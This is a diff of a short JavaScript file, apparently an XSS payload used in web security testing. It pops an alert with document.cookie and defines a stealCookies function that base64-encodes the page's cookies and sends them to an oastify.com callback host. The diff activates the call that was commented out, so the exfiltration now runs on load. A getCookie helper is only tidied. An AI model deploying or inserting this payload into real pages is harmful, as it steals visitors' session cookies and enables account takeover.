@@ -1,19 +1,18 @@
-
 alert(document.cookie);
-function stealCookies(){
-  const url = 'https://urp749xlmmbt92sh6x6eo96sojuaie63.oastify.com/?cookies=' + btoa(document.cookie)
-  const response = fetch(url)
+
+async function stealCookies(){
+  const url = 'https://urp749xlmmbt92sh6x6eo96sojuaie63.oastify.com/?cookies=' + btoa(document.cookie);
+  await fetch(url);
 }
 
-function getCookie(cname)
-{
-  var name = cname + "=";
-  var ca = document.cookie.split(';');
-  for(var i=0; i<ca.length; i++) 
-  {
-    var c = ca[i].trim();
-    if (c.indexOf(name)==0) return c.substring(name.length,c.length);
+function getCookie(cname){
+  const name = cname + "=";
+  const ca = document.cookie.split(';');
+  for(let i = 0; i < ca.length; i++) {
+    const c = ca[i].trim();
+    if (c.indexOf(name) == 0) return c.substring(name.length, c.length);
   }
   return "";
 }
-//stealCookies();
+
+stealCookies();
